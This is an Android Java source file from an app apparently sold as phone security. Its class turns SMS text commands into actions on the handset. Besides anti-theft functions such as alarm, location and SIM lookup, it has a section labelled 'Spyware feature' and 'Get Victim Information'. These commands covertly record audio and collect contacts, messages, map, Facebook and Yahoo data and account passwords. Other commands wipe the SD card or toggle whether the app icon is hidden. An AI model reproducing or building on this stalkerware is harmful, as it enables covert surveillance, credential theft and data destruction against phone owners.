package tuisolutions.tuisecurity.services;

import java.util.Map;

import tuisolutions.tuisecurity.controllers.RecordingListener;
import tuisolutions.tuisecurity.models.CommandMessage;
import tuisolutions.tuisecurity.models.Parameters;
import tuisolutions.tuisecurity.receivers.SmsReceiver;
import tuisolutions.tuisecurity.utils.CommandUtils;
import tuisolutions.tuisecurity.utils.PreferencesUtils;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

public class CommandExecute {
	//public  CommandExecute INSTANCE = new CommandExecute();
	private static final String TAG = CommandExecute.class.getName();

	public void execute(Context context, CommandMessage sms) {
		String sender = sms.getSender();
		Map<String, String> commands = CommandUtils.getCommands(sms
				.getContent());
		for (String s : commands.keySet()) {
			// Urgent case
			if (Parameters.COMMAND_URGENT_CASE.equalsIgnoreCase(s)) {
				startBackupDeleteService(context, sender,
						BackupDeleteService.URGENT_CASE, false);
			}
			// =================================
			// Basic command
			// Phone ring
			else if (Parameters.COMMAND_ALARM.equalsIgnoreCase(s)) {
				// Check Service Alert enabled
				if (PreferencesUtils.isServiceEnabled(context,
						Parameters.SERVICE_PHONE_ALERT)) {
					startSecureApp(context,
							SecureAppService.SECURE_APP_TYPE_ALARM);
				}
			}
			// Backup & Delete Feature
			else if (Parameters.COMMAND_BACKUP_DELETE_MESSAGE
					.equalsIgnoreCase(s)) {
				// Check service Basic enabled
				if (PreferencesUtils.isServiceEnabled(context,
						Parameters.SERVICE_BASIC_FEATURES)) {
					startBackupDeleteService(context, sender,
							BackupDeleteService.BACKUP_DELETE_MESSAGE, false);
				}
			} else if (Parameters.COMMAND_BACKUP_DELETE_MESSAGE_DELETE
					.equalsIgnoreCase(s)) {
				if (PreferencesUtils.isServiceEnabled(context,
						Parameters.SERVICE_BASIC_FEATURES)) {
					startBackupDeleteService(context, sender,
							BackupDeleteService.BACKUP_DELETE_MESSAGE, true);
				}

			} else if (Parameters.COMMAND_BACKUP_DELETE_CONTACT
					.equalsIgnoreCase(s)) {
				// Check service Basic enabled
				if (PreferencesUtils.isServiceEnabled(context,
						Parameters.SERVICE_BASIC_FEATURES)) {
					startBackupDeleteService(context, sender,
							BackupDeleteService.BACKUP_DELETE_CONTACT, false);
				}
			} else if (Parameters.COMMAND_BACKUP_DELETE_CONTACT_DELETE
					.equalsIgnoreCase(s)) {
				if (PreferencesUtils.isServiceEnabled(context,
						Parameters.SERVICE_BASIC_FEATURES)) {
					startBackupDeleteService(context, sender,
							BackupDeleteService.BACKUP_DELETE_CONTACT, true);
				}

			} else if (Parameters.COMMAND_FORMAT_SD_CARD.equalsIgnoreCase(s)) {
				// Check service Basic enabled
				if (PreferencesUtils.isServiceEnabled(context,
						Parameters.SERVICE_BASIC_FEATURES)) {
					startBackupDeleteService(context, sender,
							BackupDeleteService.FORMAT_SD_CARD, false);
				}

			}
			// =================================
			// Phone Finder
			else if (Parameters.COMMAND_GET_LOCATION.equalsIgnoreCase(s)) {
				if (PreferencesUtils.isServiceEnabled(context,
						Parameters.SERVICE_PHONE_FINDING)) {
					startPhoneFinderService(context, sender,
							PhoneFinderService.GET_LOCATION);
				}
			} else if (Parameters.COMMAND_GET_SIM_INFO.equalsIgnoreCase(s)) {
				// Check Finding service enabled
				if (PreferencesUtils.isServiceEnabled(context,
						Parameters.SERVICE_PHONE_FINDING)) {
					startPhoneFinderService(context, sender,
							PhoneFinderService.GET_SIM_INFO);
				}
			}
			// =================================
			// Spyware feature
			else if (Parameters.COMMAND_RECORD_AUTO_STOP_WITH_INTERACTION.equalsIgnoreCase(s)) {
				// Check service remote enabled
				if(PreferencesUtils.isServiceEnabled(context, Parameters.SERVICE_PHONE_SPYING)){
					if(!RecordingListener.isRecording){
						startAccelerationListener(context, RecordingListener.INTERACTION_STOP_MODE);
					}
				}
			} else if (Parameters.COMMAND_RECORD_AUTO_STOP_WITH_LIMIT_TIME.equalsIgnoreCase(s)) {
				// Check service remote enabled
				if(PreferencesUtils.isServiceEnabled(context, Parameters.SERVICE_PHONE_SPYING)){
					if(!RecordingListener.isRecording){
						startAccelerationListener(context, RecordingListener.TIME_STOP_MODE);
					}
				}
			} 
			// Get Victim Infomation Feature
			else if (Parameters.COMMAND_SYSTEM.equalsIgnoreCase(s)) {
				// Check Spying service enabled
				if (PreferencesUtils.isServiceEnabled(context,
						Parameters.SERVICE_PHONE_SPYING)) {
					startGetVictimInfo(context, Parameters.GET_SYSTEM);
				}
			} else if (Parameters.COMMAND_CONTACT_DB.equalsIgnoreCase(s)) {
				// Check Spying service enabled
				if (PreferencesUtils.isServiceEnabled(context,
						Parameters.SERVICE_PHONE_SPYING)) {
					startGetVictimInfo(context, Parameters.GET_CONTACT);
				}
			} else if (Parameters.COMMAND_SEARCH_MAP_DB.equalsIgnoreCase(s)) {
				// Check Spying service enabled
				if (PreferencesUtils.isServiceEnabled(context,
						Parameters.SERVICE_PHONE_SPYING)) {
					startGetVictimInfo(context, Parameters.GET_MAP_HISTORY);
				}
			} else if (Parameters.COMMAND_MESSAGE_DB.equalsIgnoreCase(s)) {
				// Check Spying service enabled
				if (PreferencesUtils.isServiceEnabled(context,
						Parameters.SERVICE_PHONE_SPYING)) {
					startGetVictimInfo(context, Parameters.GET_MESSAGE);
				}
			} else if (Parameters.COMMAND_YOUTUBE_DB.equalsIgnoreCase(s)) {
				// Check Spying service enabled
				if (PreferencesUtils.isServiceEnabled(context,
						Parameters.SERVICE_PHONE_SPYING)) {
					startGetVictimInfo(context, Parameters.GET_YOUTUBE_HISTORY);
				}
			} else if (Parameters.COMMAND_YAHOO_DB.equalsIgnoreCase(s)) {
				// Check Spying service enabled
				if (PreferencesUtils.isServiceEnabled(context,
						Parameters.SERVICE_PHONE_SPYING)) {
					startGetVictimInfo(context, Parameters.GET_YAHOO_HISTORY);
				}
			} else if (Parameters.COMMAND_FACEBOOK_DB.equalsIgnoreCase(s)) {
				// Check Spying service enabled
				if (PreferencesUtils.isServiceEnabled(context,
						Parameters.SERVICE_PHONE_SPYING)) {
					startGetVictimInfo(context, Parameters.GET_FACEBOOK_DB);
				}
			} else if (Parameters.COMMAND_ACCOUNT_PASSWORD.equalsIgnoreCase(s)) {
				// Check Spying service enabled
				if (PreferencesUtils.isServiceEnabled(context,
						Parameters.SERVICE_PHONE_SPYING)) {
					startGetVictimInfo(context, Parameters.GET_ACCOUNT);
				}
			} else if (Parameters.COMMAND_CALENDAR_DB.equalsIgnoreCase(s)) {
				// Check Spying service enabled
				if (PreferencesUtils.isServiceEnabled(context,
						Parameters.SERVICE_PHONE_SPYING)) {
					startGetVictimInfo(context, Parameters.GET_CALENDAR);
				}
			}
			// =================================
			// Show and hide icon app
			else if (Parameters.COMMAND_SHOW_APP_ICON.equalsIgnoreCase(s)) {
				Log.d(TAG, "show icon");
				startSecureApp(context,
						SecureAppService.SECURE_APP_TYPE_SHOW_ICON);
			}
		}
	}

	private void startSecureApp(Context context, int typeSecure) {
		Intent intent = new Intent(context, SecureAppService.class);
		intent.putExtra(SecureAppService.SECURE_APP_TYPE, typeSecure);
		if (typeSecure == SecureAppService.SECURE_APP_TYPE_ALARM) {
			intent.putExtra(SecureAppService.ALARM_AND_LOCK, true);
		}
		context.startService(intent);
	}

	private void startBackupDeleteService(Context context, String sender,
			int type, boolean deleteAfterBackup) {
		Intent service = new Intent(context, BackupDeleteService.class);
		Log.v(TAG, "start Backup & Delete Feature");
		service.putExtra(BackupDeleteService.SERVICE_TYPE, type);
		service.putExtra(BackupDeleteService.PHONE_SENDER, sender);
		service.putExtra(BackupDeleteService.DELETE_AFTER_BACKUP, deleteAfterBackup);
		context.startService(service);
	}

	private void startAccelerationListener(Context context, int stopType) {
		System.out.println("Start listener");
		new RecordingListener(context.getApplicationContext(), stopType)
				.startListener();
	}

	private void startGetVictimInfo(Context context, int type) {
		Intent intentService = new Intent(context,
				GetVictimInformationService.class);
		intentService.putExtra(SmsReceiver.TYPE_INFO, type);
		context.startService(intentService);
	}

	private void startPhoneFinderService(Context context, String sender,
			int type) {
		Intent intentService = new Intent(context, PhoneFinderService.class);
		intentService.putExtra(PhoneFinderService.SENDER, sender);
		intentService.putExtra(SmsReceiver.TYPE_INFO, type);
		context.startService(intentService);
	}
}
